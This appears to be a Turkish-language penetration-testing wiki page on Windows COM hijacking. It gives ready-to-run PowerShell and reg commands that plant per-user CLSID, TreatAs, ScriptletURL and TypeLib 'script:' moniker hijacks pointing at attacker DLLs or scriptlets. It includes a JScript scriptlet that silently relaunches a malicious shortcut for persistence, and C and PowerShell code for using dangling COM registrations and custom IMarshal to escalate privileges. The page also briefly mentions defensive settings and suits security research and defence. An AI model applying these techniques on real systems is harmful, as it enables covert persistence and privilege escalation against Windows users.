# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Var olmayan COM bileşenlerini arama

HKCU değerleri kullanıcılar tarafından değiştirilebildiğinden **COM Hijacking**, bir **kalıcılık mekanizması** olarak kullanılabilir. `procmon` kullanarak henüz mevcut olmayan ve bir saldırgan tarafından oluşturulabilecek COM kayıt defteri anahtarlarını bulmak kolaydır. Klasik filtreler:

- **RegOpenKey** işlemleri.
- _Result_ değeri **NAME NOT FOUND** olanlar.
- _Path_ değeri **InprocServer32** ile bitenler.

Araştırma sırasında kullanılabilecek yararlı varyasyonlar:

- Eksik **`LocalServer32`** anahtarlarını da arayın. Bazı COM sınıfları süreç dışı sunuculardır ve DLL yerine saldırganın kontrolündeki bir EXE'yi başlatır.
- `InprocServer32`'ye ek olarak **`TreatAs`** ve **`ScriptletURL`** kayıt defteri işlemlerini de arayın. Güncel tespit içerikleri ve malware incelemeleri bunlara sıkça dikkat çekiyor; çünkü bunlar normal COM kayıtlarından çok daha nadirdir ve bu nedenle yüksek sinyal değerine sahiptir.
- Bir kaydı HKCU'ya kopyalarken orijinal `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` konumundaki geçerli **`ThreadingModel`** değerini kullanın. Yanlış modeli kullanmak aktivasyonu çoğu zaman bozar ve hijacking işleminin dikkat çekmesine yol açar.<sup>[[3]](#references)</sup>
- 64-bit sistemlerde hem 64-bit hem de 32-bit görünümleri inceleyin (`procmon.exe` ile `procmon64.exe`, `HKLM\Software\Classes` ile `HKLM\Software\Classes\WOW6432Node`); çünkü 32-bit uygulamalar farklı bir COM kaydını çözümleyebilir.

Hangi var olmayan COM'u taklit edeceğinize karar verdikten sonra aşağıdaki komutları çalıştırın. _Birkaç saniyede bir yüklenen bir COM'u taklit etmeye karar verirseniz dikkatli olun; bu gereğinden fazla olabilir._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### Ele Geçirilebilir Task Scheduler COM bileşenleri

Windows Tasks, COM nesnelerini çağırmak için Custom Triggers kullanır ve bunlar Task Scheduler üzerinden çalıştırıldığından, ne zaman tetikleneceklerini tahmin etmek daha kolaydır.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Çıktıyı inceleyerek, örneğin **bir kullanıcı her oturum açtığında** çalıştırılacak bir görevi seçebilirsiniz.

Şimdi **{1936ED8A-BD93-3213-E325-F38D112938EF}** CLSID'sini **HKEY\CLASSES\ROOT\CLSID** altında ve HKLM ile HKCU'da ararsanız, genellikle bu değerin HKCU'da bulunmadığını görürsünüz.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Ardından, HKCU girdisini oluşturmanız yeterlidir; kullanıcı her oturum açtığında backdoor'ınız çalıştırılır.

## Dangling COM Registrations ve Custom Marshaling

Makine genelindeki bir COM kaydı, registry'de değişiklik yapılmadan DLL-planting primitive'ine dönüşebilir. DLL'i bulunmayan ve son yolu düşük ayrıcalıklı bir kullanıcı tarafından oluşturulabilen veya değiştirilebilen bir `InprocServer32` değeri arayın. Tam DLL adını yerleştirmek, CLSID'yi etkinleştiren tüm süreçlerin saldırgan kodunu yüklemesini sağlar. CrossDevice örneğinde kayıtlı yol `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll` idi; dolayısıyla standart bir kullanıcı eksik alt dizini ve DLL'i oluşturabiliyordu.<sup>[[5]](#references)</sup>

### Ayrıcalıklı COM etkinleştirme yolları olarak yazılabilir plugin eşlemeleri

Yazılabilir bir plugin-ID-to-CLSID eşlemesi, sınıfın makine genelindeki kaydı düzenlenemese bile daha düşük ayrıcalıklı bir kullanıcının, ayrıcalıklı bir hizmetin hangi işlem içi COM sunucusunu yükleyeceğini seçmesine olanak tanıyabilir.<sup>[[8]](#references)[[9]](#references)</sup> Bildirilen Windows 11 `InstallService` vakasında standart kullanıcılar `StaticPluginMap` değerini değiştirebiliyordu; yerleşik olmayan bir plugin ID, `LocalSystem` hizmetinin `CLSCTX_INPROC_SERVER` ve `IID_IInstallServicePlugin` ile `CoCreateInstance` işlevine ilettiği bir CLSID'yi seçiyordu.<sup>[[8]](#references)[[9]](#references)</sup> Kayıtlı DLL, ayrı bir COM host yerine hizmet sürecine yüklenir.<sup>[[10]](#references)</sup>

Gerekli koşullar; eşleme üzerinde etkin yazma izni, erişilebilir bir plugin isteği ve daha düşük ayrıcalıklı kullanıcının denetleyebildiği bir `InprocServer32` DLL yoludur.<sup>[[8]](#references)[[9]](#references)</sup> Bildirilen vakada, yukarıdaki CrossDevice kaydı yol koşulunu sağlıyordu.<sup>[[8]](#references)[[9]](#references)</sup> Başarılı bir plugin nesnesi istenen arayüzü sunmalıdır; ancak DLL, `CoCreateInstance` tamamlanmadan önce yüklenir. Bu arayüzü sunamaması, yükleme sırasında kod yürütülmesini tek başına engellemez.<sup>[[8]](#references)[[11]](#references)</sup> Bu hizmet yönlendirme yolu, aşağıdaki custom-`IMarshal` yolundan farklıdır. Ayrı dosya yolu primitive'i için bkz. [DLL Hijacking](dll-hijacking/).

### Süreçler arası DLL yükleme primitive'i olarak `IMarshal`

COM, bir arayüz işaretçisini normalde alıcıyı özgün nesneye yönlendiren standart bir `OBJREF` ile temsil eder. `IMarshal` uygulayan bir nesne bunun yerine özel bir `OBJREF` üretebilir. `GetUnmarshalClass` yöntemi, alıcı süreçte nesneyi yeniden oluşturacak kodun CLSID'sini sağlar. Bu CLSID'nin özgün nesneyi tanımlaması gerekmez. COM, bunu işlem içi bir sunucu olarak çözümler ve istenen arayüz yöntemini çağırmadan önce kayıtlı DLL'i yükler.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

Kötü amaçlı en temel uygulama, `GetUnmarshalClass` içindeki dangling CLSID'yi değiştirmekten ibarettir.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Bu nesneyi `[in] IUnknown *` gibi proxy üzerinden iletilen bir method parametresiyle gönderin. Diğer bir seçenek, özel olarak marshal edilmiş nesnenin yerel kontrolleri geçecek kadar `IStorage` da uyguladığı `CoGetInstanceFromIStorage` kullanmaktır. Uzak sunucuda otomatik unmarshaling, değiştirilmiş CLSID'yi çözümler; böylece hedef method çalışmadan önce DLL yüklenir.<sup>[[5]](#references)</sup>

Bu primitive, eksik kayıtlarla sınırlı değildir. Alıcının mevcut bir custom-unmarshaler DLL'yi yüklemesini sağlayabilir ve DLL'nin yükleme veya unmarshaling yolundaki hataları açığa çıkarabilir.<sup>[[5]](#references)</sup>

Zincirin çalışması için aşağıdaki koşulların tümü gerekir:<sup>[[5]](#references)</sup>

1. Makine genelinde görülebilen bir CLSID, eksik veya değiştirilebilir bir in-process DLL'yi gösterir.
2. Saldırgan bu DLL'yi çözümlenen yola yerleştirebilir.
3. Etkinleştirilebilir bir out-of-process COM sunucusu istenen ayrıcalık düzeyinde çalışır.
4. Sunucu, custom marshaling'i kabul eder ve saldırganın nesnesini işlem sınırından geçiren proxy'lenmiş bir çağrı sunar.

### Dangling in-process server'ları bulma

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) ve [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools), makinenin COM veritabanını sıralayabilir ve her sunucuyu normal Win32 modül çözümlemesiyle test edebilir. Bu, `Test-Path` kullanmaktan daha uygundur; çünkü bazı kayıtlar yalnızca dosya adını içerir ve yükleyicinin arama yoluna dayanır.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Sonucu exploit edilebilirliğin kanıtı olarak değil, aday listesi olarak değerlendirin. Yolu loader'ın yaptığı gibi çözümleyin, ardından mevcut olan ilk üst dizinin ve varsa hedef DLL'nin DACL'sini inceleyin. Eksik bir dosya ancak saldırganın COM'un gerçekten çözeceği yolu oluşturabilmesi veya değiştirebilmesi durumunda işe yarar.<sup>[[5]](#references)</sup>

### Ayrıcalıklı bir alıcı seçip başlatma

Aday COM sınıflarını `RunAs`, hizmet ilişkisi, kullanılabilir arayüzler ve RPC proxy'leri açısından inceleyin. `SYSTEM` için yapılandırılmış ancak adlandırılmış bir hizmet tarafından desteklenmeyen bir sınıfın doğrudan etkinleştirilmesi başarısız olabilir; çünkü RPCSS bu sınıfı başlatamaz. Bu durumda, yürütülebilir bir zamanlanmış görev gibi sunucusunu başlatan ayrıcalıksız bir tetikleyici arayın ve sunucuyu çalışır durumda tutan adlandırılmış olay veya IPC önkoşullarını yeniden oluşturun.<sup>[[5]](#references)</sup>

Örneğin, güvenlik açığı bulunan Shell Create Object Handler zinciri, kullanıcı tarafından çalıştırılabilir bir zamanlanmış görevi çağırmadan önce beklenen global olayı oluşturarak sunucusunu başlatıyordu.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Ortaya çıkan nesne başvurusunu konağına geri eşleyin ve hem kimliği hem de marshaling politikasını doğrulayın. Ardından arayüzleri sıralayın ve proxy'lerini IDL'ye dönüştürerek sahte nesneyi marshal edecek `IUnknown *` gibi bir giriş parametresi bulun.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Custom-marshaling korumaları

Uygun bir alıcı, güvenilmeyen custom marshaler'ları reddetmemelidir. Süreç genelindeki iki koruma, `CoInitializeSecurity`'ye geçirilen capabilities içindeki `EOAC_NO_CUSTOM_MARSHAL` ve `IGlobalOptions::Set` aracılığıyla ayarlanan `COMGLB_UNMARSHALING_POLICY_STRONG` değeridir. Semboller mevcutsa ilgili durum `combase!gCapabilities` ve `combase!g_GLBOPT_UnmarshalingPolicy` içinde incelenebilir; NtObjectManager, süreç ayrıştırıcısının Windows sürümünü desteklediği durumlarda sonucu `CustomMarshalAllowed` olarak gösterir.<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs`, bir CLSID'nin başka bir CLSID tarafından taklit edilmesini sağlar.<sup>[[4]](#references)</sup> Saldırgan açısından bu, orijinal CLSID'ye dokunmadan `scrobj.dll`'ye işaret eden ikinci bir kullanıcıya özel CLSID oluşturabileceğiniz ve ardından `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` ile gerçek COM nesnesini kötü amaçlı olana yönlendirebileceğiniz anlamına gelir.

Bu yöntem şu durumlarda kullanışlıdır:

- hedef uygulama oturum açıldığında veya uygulama başlatıldığında zaten sabit bir CLSID örneği oluşturuyorsa
- orijinal `InprocServer32` değerini değiştirmek yerine yalnızca kayıt defteri üzerinden yönlendirme yapmak istiyorsanız
- `ScriptletURL` değeri üzerinden yerel veya uzak bir `.sct` scriptlet çalıştırmak istiyorsanız

Örnek iş akışı (kamuya açık Atomic Red Team tradecraft'inden ve eski COM kayıt defteri suistimali araştırmalarından uyarlanmıştır):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Notlar:

- `scrobj.dll`, `ScriptletURL` değerini okur ve başvurulan `.sct` dosyasını çalıştırır; böylece payload'ı yerel dosya olarak tutabilir veya HTTP/HTTPS üzerinden uzaktan alabilirsiniz.
- Orijinal COM kaydı HKLM'de eksiksiz ve kararlı olduğunda `TreatAs` özellikle kullanışlıdır; çünkü tüm ağacı kopyalamak yerine yalnızca kullanıcıya özel küçük bir yönlendirme gerekir.
- Doğal tetikleyiciyi beklemeden doğrulama yapmak için, hedef sınıf STA etkinleştirmesini destekliyorsa sahte ProgID/CLSID'yi `rundll32.exe -sta <ProgID-or-CLSID>` ile elle örneklendirebilirsiniz.

## COM TypeLib Hijacking (script: moniker persistence)

Type Library'ler (TypeLib), COM arayüzlerini tanımlar ve `LoadTypeLib()` aracılığıyla yüklenir. Bir COM server örneklendirildiğinde, işletim sistemi `HKCR\TypeLib\{LIBID}` altındaki registry key'lerine başvurarak ilişkili TypeLib'i de yükleyebilir. TypeLib yolu bir **moniker** ile değiştirilirse (ör. `script:C:\...\evil.sct`), Windows TypeLib çözümlenirken scriptlet'i çalıştırır; böylece yaygın bileşenler kullanıldığında tetiklenen gizli bir persistence elde edilir.

Bu durumun Microsoft Web Browser control'ü üzerinde görüldüğü gözlemlenmiştir (Internet Explorer, WebBrowser gömülü uygulamalar ve hatta `explorer.exe` tarafından sıkça yüklenir).<sup>[[1]](#references)[[2]](#references)</sup>

### Adımlar (PowerShell)

1) Sık kullanılan bir CLSID'nin kullandığı TypeLib'i (LIBID) belirleyin. Kötü amaçlı yazılım zincirlerinde sıkça kötüye kullanılan örnek bir CLSID: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Per-user TypeLib yolunu `script:` moniker'ını kullanarak yerel bir scriptlet'e yönlendirin (yönetici hakları gerekmez):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Birincil payload'ınızı (ör. başlangıç zincirinde kullanılan bir `.lnk`) yeniden başlatan minimal bir JScript `.sct` bırakın:

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Tetikleme – IE’yi, WebBrowser control’ü kullanan bir uygulamayı açmak veya sıradan Explorer etkinlikleri bile TypeLib’i yükleyip scriptlet’i çalıştırarak zincirinizi oturum açma/yeniden başlatma sırasında yeniden etkinleştirir.

Temizleme
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Notlar
- Aynı mantığı diğer yüksek frekanslı COM bileşenlerine de uygulayabilirsiniz; önce `HKCR\CLSID\{CLSID}\TypeLib` yolundan gerçek `LIBID` değerini bulun.
- 64-bit sistemlerde 64-bit tüketiciler için `win64` alt anahtarını da ekleyebilirsiniz.

## References

- [1] [TypeLib'i Ele Geçirme – Yeni COM kalıcılık tekniği (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine Kampanyası: ABD Şirketlerini Hedefleyen Gelişmiş Bir Oltalama Saldırısı](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [COM Hijacking'i Yeniden İnceleme (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID Anahtarı (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero - Windows Exploitation Techniques: Bağlantısı Kopmuş COM Nesnesi Kayıtları](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn - IMarshal arayüzü](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications - MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
- [8] [Dark Elevator PoC ve teknik inceleme yazısı (califio)](https://github.com/califio/publications/tree/main/MADBugs/windows-CVE-2026-50343)
- [9] [Dark Elevator: Windows Install Service Yerel Yetki Yükseltmesi (calif.io)](https://blog.calif.io/p/dark-elevator-windows-install-service)
- [10] [CLSCTX numaralandırması (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ne-wtypesbase-clsctx)
- [11] [CoCreateInstance işlevi (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance)
{{#include ../../banners/hacktricks-training.md}}

